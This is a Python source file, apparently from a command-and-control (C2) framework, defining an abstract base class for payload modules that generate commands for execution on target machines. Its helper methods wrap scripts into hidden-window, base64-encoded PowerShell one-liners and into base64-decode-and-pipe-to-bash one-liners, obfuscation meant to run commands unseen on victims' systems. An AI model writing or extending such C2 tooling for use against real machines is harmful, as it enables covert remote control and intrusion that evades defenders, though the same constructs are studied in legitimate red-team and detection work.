import base64
from abc import ABC, abstractmethod

from sqlmodel import Session


class BaseModule(ABC):
    """Abstract base for all C2 payload modules."""

    @abstractmethod
    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        """Return an OS-specific command string ready for execution on the target."""
        ...

    @staticmethod
    def _wrap_powershell(script: str) -> str:
        """Wrap a PowerShell script into a hidden, base64-encoded one-liner."""
        encoded = base64.b64encode(script.encode("utf-16le")).decode()
        return (
            "powershell -NoProfile -WindowStyle Hidden "
            f"-EncodedCommand {encoded}"
        )

    @staticmethod
    def _wrap_bash(script: str) -> str:
        """Wrap a Bash script into a base64-decoded pipe one-liner."""
        encoded = base64.b64encode(script.encode()).decode()
        return f'echo {encoded} | base64 -d | bash'
